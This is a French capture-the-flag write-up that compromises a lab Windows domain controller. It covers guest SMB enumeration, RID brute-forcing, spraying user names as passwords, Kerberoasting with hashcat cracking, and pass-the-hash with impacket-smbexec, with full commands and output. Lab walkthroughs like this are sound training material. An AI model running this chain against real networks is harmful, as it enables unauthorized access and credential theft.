- **IP**:
```
10.10.111.175
```

- **OS**: windows

## Énumération

- **nmap**:
```
nmap -T4 -n -sC -sV -Pn -p- 10.10.111.175
```

- `-T4`:  accélère le scan
- `-n`: pas de résolution DNS
- `-sC`: scan les scripts par défauts sur les ports trouvés
- `-sV`: pour détecter les versions des services
- `-Pn`: pas de ping
- `-p-`: touts les ports TCP

![[Soupedecode 01/file/nmap.png]]

- **énumération de la partage SMB**:
```
nxc smb dc01.soupedecode.local -u 'guest' -p '' --shares
```
- `nxc`: Netexec
- `-u 'guest'`: nom compte utilisé pour tenter l'auth SMB
- `-p ''`: password vide
- `--shares`: demande à nxc d'énumérer les partages SMB accessibles sur la cible

![[partageSMB.png]]

Grâce à ça, on peut constater que la que la connexion en tant qu'utilisateur invité est autorisée et nous accorde un accès en lecture au partage **IPC$**.

- **Découvrir les users name:**
```
nxc smb dc01.soupedecode.local -u 'guest' -p '' --rid-brute 3000
```
- `--rid-brute 3000`: demande à l’outil d’énumérer des comptes en « brute-forçant » des RIDs (Relative IDs) à partir du nombre **3000**

![[domainUser.png]]

Une pratique courante consiste à utiliser son nom d'utilisateur comme mot de passe. En tentant d'authentifier chaque utilisateur avec son nom d'utilisateur comme mot de passe, nous avons réussi à identifier les identifiants valides de l'utilisateur `ybob317`. La preuve

```
$ nxc smb dc01.soupedecode.local -u valid_usernames.txt -p valid_usernames.txt --no-bruteforce --continue-on-success
SMB         10.10.67.33     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.67.33     445    DC01             [-] SOUPEDECODE.LOCAL\Administrator:Administrator STATUS_LOGON_FAILURE
SMB         10.10.67.33     445    DC01             [-] SOUPEDECODE.LOCAL\Guest:Guest STATUS_LOGON_FAILURE
SMB         10.10.67.33     445    DC01             [-] SOUPEDECODE.LOCAL\krbtgt:krbtgt STATUS_LOGON_FAILURE
SMB         10.10.67.33     445    DC01             [-] SOUPEDECODE.LOCAL\DC01$:DC01$ STATUS_LOGON_FAILURE
SMB         10.10.67.33     445    DC01             [-] SOUPEDECODE.LOCAL\bmark0:bmark0 STATUS_LOGON_FAILURE
...
SMB         10.10.67.33     445    DC01             [+] SOUPEDECODE.LOCAL\ybob317:ybob317
...
```

- l’outil liste les partages accessibles et leurs permissions avec l'user `bob317`
```
nxc smb dc01.soupedecode.local -u 'ybob317' -p 'ybob317' --shares
```
Ici on a : `SOUPEDECODE.LOCAL\ybob317:ybob317`

- Se connecter au serveur SMB:
```
impacket-smbclient 'SOUPEDECODE.LOCAL/ybob317:ybob317@dc01.soupedecode.local'
```
![[userflag.png]]

## Obtenir le rootflag

- repérer les comptes AD ayant un **SPN** (Service Principal Name) et **récupérer les TGS** associés (*Kerberoasting*):
```
impacket-GetUserSPNs -request -outputfile kerberoastables.txt 'SOUPEDECODE.LOCAL/ybob317:ybob317'
```

![[Kerberoasting.png]]

- Cracker les mdps avec **hashcat**
```
hashcat kerberoastables.txt /usr/share/wordlists/rockyou.txt
```

![[resulthashcat.png]]

On obtient donc un login : `file_svc:Password123`

- Accéder au partage
```
nxc smb dc01.soupedecode.local -u 'file_svc' -p 'Password123!!' --shares
```

![[backupshare.png]]
On a ici un partage appelé **backup**. Nous allons l'éxplorer:
![[explorebackup.png]]

Comme nous le constatons on a trouvé un fichier intéressant :`backup_extract.txt` Le fichier contient des noms de comptes qui correspondent à des **NTLM hashes**. On va donc diviser le fichier pour avoir une liste séparé de **username** et de **NTLM hashes**.

```
$ cat backup_extract.txt | cut -d ':' -f 1 > backup_extract_users.txt
$ cat backup_extract.txt | cut -d ':' -f 4 > backup_extract_hashes.txt
```

- Nous allons utiliser **nxc** de nouveau pour avoir les potentiels comptes valides
```
nxc smb dc01.soupedecode.local -u backup_extract_users.txt -H backup_extract_hashes.txt --no-bruteforce --continue-on-success
```

![[uservalide.png]]

On a eu : `FileServer$:e41da7e79a4c76dbd9cf79d1cb325559`
Le **Pwn3d!** indique que cet utilisateur à le droit d'admin. Il ne nous reste plus qu'à s'y connecter donc
```
impacket-smbexec -hashes :e41da7e79a4c76dbd9cf79d1cb325559 'SOUPEDECODE.LOCAL/FileServer$@dc01.soupedecode.local'
```
![[rootflag.png]]





